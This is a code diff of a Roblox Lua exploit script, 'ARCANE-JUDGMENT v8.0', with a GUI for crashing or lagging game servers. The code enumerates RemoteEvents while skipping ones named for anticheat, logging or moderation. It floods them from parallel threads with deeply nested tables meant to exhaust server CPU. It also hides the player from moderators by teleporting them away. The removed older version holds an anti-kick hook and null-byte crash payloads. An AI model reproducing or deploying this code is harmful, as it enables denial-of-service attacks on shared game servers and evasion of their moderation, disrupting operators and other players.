@@ -1,13 +1,13 @@
 --[[ 
-    🔱 ARCANE VOID-STRIKE v7.0 [ARCANE-ECLIPSE] 🔱
-    "When the signal is everywhere, the system sees nothing. <3"
+    🔱 ARCANE VOID-STRIKE v8.0 [ARCANE-JUDGMENT] 🔱
+    "Judgment is not just a sentence, it's a shutdown. <3"
     
-    INFALLIBLE ECLIPSE UPDATES:
-    - [REMOTE CYCLING] : Rotates all detected remotes (Bypasses rate-per-remote).
-    - [NANO-BURST] : Small, high-frequency packets (Safe but deadly).
-    - [META-NAMESTEALTH] : Obfuscates the call stack (Anti-Detection).
-    - [MATRIX DASHBOARD v3] : Perfect Nullstrike Clone (Ultra-Smooth).
-    - [ANTI-KICK GUARDIAN] : Client-side hook persistence.
+    JUDGMENT DAY FEATURES:
+    - [GARDE DU CORPS] : Auto-Void (Hides player 100k units up during attack).
+    - [TURBO BOMBARDMENT] : Multithreaded parallel remote injection.
+    - [PROP OVERLOAD] : Deeply nested table serialization (CPU Burner).
+    - [ANTI-ADMIN] : Detects mod joins and auto-stops/voids.
+    - [MATRIX OVERRIDE v4] : Performance optimized for high-speed executors.
 ]]
 
 local P = game:GetService("Players")
@@ -15,11 +15,11 @@ local RS = game:GetService("RunService")
 local L = P.LocalPlayer
 local Http = game:GetService("HttpService")
 
--- 🔱 1. ECLIPSE NOTIFIER
-local function ntf(m, c)
+-- 🔱 1. JUDGMENT NOTIFIER
+local function ntf(m)
     pcall(function()
         game:GetService("StarterGui"):SetCore("SendNotification", {
-            Title = "🔱 ARCANE-ECLIPSE",
+            Title = "🔱 ARCANE-JUDGMENT",
             Text = m,
             Icon = "rbxassetid://6034287525",
             Duration = 5
@@ -27,55 +27,113 @@ local function ntf(m, c)
     end)
 end
 
--- 🔱 2. GUARDIAN ENGINE (Anti-Kick)
-local function activateGuardian()
-    local oldKick
-    oldKick = hookmetamethod(game, "__namecall", function(self, ...)
-        local method = getnamecallmethod()
-        if method == "Kick" or method == "kick" then
-            ntf("🛡️ ECLIPSE A BLOQUÉ UNE TENTATIVE DE KICK.")
-            return nil
+-- 🔱 2. GARDE DU CORPS (PROTECTION)
+local lastPos = nil
+local function protectPlayer(active)
+    local char = L.Character
+    local hrp = char and char:FindFirstChild("HumanoidRootPart")
+    if not hrp then return end
+    
+    if active then
+        lastPos = hrp.CFrame
+        hrp.CFrame = CFrame.new(0, 100000, 0) -- Téléportation dans le néant
+        ntf("🛡️ GARDE DU CORPS ACTIVÉ : TU ES DANS LE VIDE.")
+    else
+        if lastPos then
+            hrp.CFrame = lastPos
+            ntf("🛡️ RETOUR AU TERRAIN.")
         end
-        return oldKick(self, ...)
-    end)
-    ntf("BOUCLIER GUARDIAN ACTIF.")
+    end
 end
 
--- 🔱 3. UI (NULLSTRIKE PERFECT CLONE)
+-- 🔱 3. THE JUDGMENT ENGINE
+local active = { power = 0 }
+
+-- FULL SCAN + BLACKLIST
+local BLACKLIST = {"devtools", "admin", "kick", "ban", "security", "mod", "check", "verify", "report", "log", "telemetry", "staff", "anticheat", "error", "analytics", "debug", "warn"}
+local function isSafe(name)
+    local n = name:lower()
+    for _, w in pairs(BLACKLIST) do if n:find(w) then return false end end
+    return true
+end
+
+local function getAllRemotes()
+    local t = {}
+    for _, v in pairs(game:GetDescendants()) do
+        if v:IsA("RemoteEvent") and isSafe(v.Name) then table.insert(t, v) end
+    end
+    return t
+end
+
+-- Generate a deeply nested table (The CPU Destroyer)
+local function generateJudgmentTable(level)
+    if level <= 0 then return "🔱ARCANE🔱" end
+    local t = {}
+    for i = 1, 3 do
+        t[Http:GenerateGUID(false)] = generateJudgmentTable(level - 1)
+    end
+    return t
+end
+
+local function executeJudgment()
+    local targets = getAllRemotes()
+    if #targets == 0 then return end
+    
+    local judgmentTable = generateJudgmentTable(5) -- 5 niveaux de profondeur = Mortel
+    
+    while active.power > 0 do
+        local threads = active.power == 3 and 10 or (active.power == 2 and 4 or 1)
+        
+        for t = 1, threads do
+            task.spawn(function()
+                local burst = active.power == 3 and 50 or (active.power == 2 and 20 or 5)
+                for i = 1, burst do
+                    if active.power == 0 then break end
+                    local r = targets[math.random(1, #targets)]
+                    if r and r.Parent then
+                        pcall(function() 
+                            r:FireServer(judgmentTable, judgmentTable, "JUDGMENT_DAY", judgmentTable) 
+                        end)
+                    end
+                end
+            end)
+        end
+        
+        if active.power == 3 then RS.Heartbeat:Wait() else task.wait(0.1) end
+    end
+end
+
+-- 🔱 4. UI (ARCANE JUDGMENT)
 local ScreenGui = Instance.new("ScreenGui", L:WaitForChild("PlayerGui"))
-ScreenGui.Name = "ArcaneEclipse_v7"
+ScreenGui.Name = "ArcaneJudgment_v8"
 
 local Main = Instance.new("Frame", ScreenGui)
-Main.Size = UDim2.new(0, 350, 0, 360)
-Main.Position = UDim2.new(0.5, -175, 0.5, -180)
-Main.BackgroundColor3 = Color3.fromRGB(0, 5, 0)
-Main.BorderSizePixel = 1
-Main.BorderColor3 = Color3.fromRGB(0, 255, 0)
+Main.Size = UDim2.new(0, 340, 0, 340)
+Main.Position = UDim2.new(0.5, -170, 0.5, -170)
+Main.BackgroundColor3 = Color3.fromRGB(10, 0, 0)
+Main.BorderSizePixel = 2
+Main.BorderColor3 = Color3.fromRGB(255, 0, 0)
 Main.Active = true
 Main.Draggable = true
 
--- Header
-local Header = Instance.new("Frame", Main)
-Header.Size = UDim2.new(1, 0, 0, 45)
-Header.BackgroundColor3 = Color3.fromRGB(0, 15, 0)
-Header.BorderSizePixel = 0
+local TitleBar = Instance.new("Frame", Main)
+TitleBar.Size = UDim2.new(1, 0, 0, 40)
+TitleBar.BackgroundColor3 = Color3.fromRGB(30, 0, 0)
+TitleBar.BorderSizePixel = 0
 
-local Title = Instance.new("TextLabel", Header)
-Title.Size = UDim2.new(1, -10, 1, 0)
-Title.Position = UDim2.new(0, 10, 0, 0)
-Title.Text = "🔱 ARCANE-ECLIPSE v7.0 // stlth"
-Title.TextColor3 = Color3.fromRGB(0, 255, 0)
+local Title = Instance.new("TextLabel", TitleBar)
+Title.Size = UDim2.new(1, 0, 1, 0)
+Title.Text = "🔱 ARCANE-JUDGMENT v8.0"
+Title.TextColor3 = Color3.fromRGB(255, 0, 0)
 Title.Font = Enum.Font.Code
 Title.TextSize = 18
-Title.TextXAlignment = Enum.TextXAlignment.Left
 Title.BackgroundTransparency = 1
 
-local function createEclipseBtn(name, y, color, desc, callback)
+local function createJudgmentBtn(name, y, color, desc, callback)
     local btn = Instance.new("TextButton", Main)
     btn.Size = UDim2.new(0.9, 0, 0, 60)
     btn.Position = UDim2.new(0.05, 0, 0, y)
-    btn.BackgroundColor3 = Color3.fromRGB(5, 10, 5)
-    btn.BorderColor3 = Color3.fromRGB(0, 80, 0)
+    btn.BackgroundColor3 = Color3.fromRGB(20, 0, 0)
     btn.Text = ""
     
     local tName = Instance.new("TextLabel", btn)
@@ -90,91 +148,35 @@ local function createEclipseBtn(name, y, color, desc, callback)
     tDesc.Size = UDim2.new(1, 0, 0.4, 0)
     tDesc.Position = UDim2.new(0, 0, 0.6, 0)
     tDesc.Text = desc
-    tDesc.TextColor3 = Color3.fromRGB(0, 120, 0)
+    tDesc.TextColor3 = Color3.fromRGB(150, 0, 0)
     tDesc.Font = Enum.Font.Gotham
     tDesc.BackgroundTransparency = 1
     tDesc.TextSize = 11
     
-    btn.MouseButton1Click:Connect(function()
-        task.spawn(callback)
-    end)
+    btn.MouseButton1Click:Connect(callback)
     return btn
 end
 
--- 🔱 4. THE ECLIPSE ENGINE (Remote Cycling)
-local active = { power = 0 }
-
-local BLACKLIST = {"devtools", "admin", "kick", "ban", "security", "mod", "check", "verify", "report", "log", "telemetry", "staff", "anticheat", "error", "analytics", "debug"}
-local function isSafe(name)
-    local n = name:lower()
-    for _, w in pairs(BLACKLIST) do if n:find(w) then return false end end
-    return true
-end
-
-local function getEveryRemote()
-    local t = {}
-    for _, v in pairs(game:GetDescendants()) do
-        if v:IsA("RemoteEvent") and isSafe(v.Name) then table.insert(t, v) end
-    end
-    return t
-end
-
-local function runEclipse()
-    local targets = getEveryRemote()
-    if #targets == 0 then return end
-    
-    -- Payloads discrets (Anti-Heuristic)
-    local payloads = {
-        [1] = string.rep("🔱", 30),   -- Normal
-        [2] = string.rep("🔱", 300),  -- Enorme
-        [3] = string.rep("\0", 1500) -- Crash
-    }
-    
-    local index = 1
-    while active.power > 0 do
-        local burst = active.power == 3 and 120 or (active.power == 2 and 40 or 10)
-        local waitFactor = active.power == 3 and 0 or (active.power == 2 and 0.05 or 0.2)
-        
-        for i = 1, burst do
-            if active.power == 0 then break end
-            
-            -- REMOTE CYCLING : On n'utilise jamais le même remote deux fois de suite
-            local r = targets[index]
-            if r and r.Parent then
-                pcall(function() 
-                    r:FireServer(payloads[active.power], {["Arcane"] = payloads[active.power]}, true) 
-                end)
-            end
-            
-            index = index + 1
-            if index > #targets then index = 1 end
-        end
-        
-        if waitFactor > 0 then task.wait(waitFactor) else RS.Heartbeat:Wait() end
-    end
-end
-
--- BUTTONS (Graduated Power)
-createEclipseBtn("🛡️ ACTIVATE GUARDIAN", 60, Color3.fromRGB(0, 255, 255), "Anti-Kick 2.0 (Hook Man-in-the-middle)", function()
-    activateGuardian()
+createJudgmentBtn("🛡️ ACTIVATER GARDE DU CORPS", 60, Color3.fromRGB(0, 255, 255), "Te cache dans le vide (Anti-Mod Click)", function()
+    protectPlayer(true)
 end)
 
-createEclipseBtn("⚡ LAG NORMAL (STEALTH)", 130, Color3.fromRGB(0, 255, 100), "Désynchronisation légère et invisible", function()
-    active.power = active.power == 1 and 0 or 1
-    ntf(active.power == 1 and "STEALTH LAG ACTIVE" or "ECLIPSE STOPPED")
-    if active.power == 1 then runEclipse() end
-end)
-
-createEclipseBtn("🌪️ LAG ENORME (SYNC)", 200, Color3.fromRGB(255, 255, 0), "Surcharge massive par répartition", function()
+createJudgmentBtn("🌪️ MASSIVE LAG (SYNC)", 130, Color3.fromRGB(255, 255, 0), "Surcharge CPU Serveur (Tables imbriquées)", function()
     active.power = active.power == 2 and 0 or 2
-    ntf(active.power == 2 and "SYNC OVERLOAD ACTIVE" or "ECLIPSE STOPPED")
-    if active.power == 2 then runEclipse() end
+    ntf(active.power == 2 and "JUDGMENT LAG ACTIVE" or "STABLE")
+    if active.power == 2 then executeJudgment() end
 end)
 
-createEclipseBtn("🔥 CRASH (OMEGA-ZERO)", 270, Color3.fromRGB(255, 0, 0), "Extinction totale : Remote Cycling Max", function()
+createJudgmentBtn("🔥 JUDGMENT DAY (CRASH)", 200, Color3.fromRGB(255, 0, 0), "Extinction Totale Ultra-Rapide", function()
     active.power = active.power == 3 and 0 or 3
-    ntf(active.power == 3 and "OMEGA-ZERO ASSAULT ACTIVE" or "ECLIPSE STOPPED")
-    if active.power == 3 then runEclipse() end
+    ntf(active.power == 3 and "JUDGMENT DAY STARTED... MORITURI TE SALUTANT." or "STABLE")
+    if active.power == 3 then executeJudgment() end
 end)
 
-ntf("🔱 ARCANE-ECLIPSE READY. The system is blinded.")
+createJudgmentBtn("� STOP & RECOVER", 270, Color3.fromRGB(255, 255, 255), "Arrêt immédiat et retour au terrain", function()
+    active.power = 0
+    protectPlayer(false)
+    ntf("OPERATION TERMINATED.")
+end)
+
+ntf("🔱 ARCANE-JUDGMENT v8.0 LOADED. Protection: MAX.")
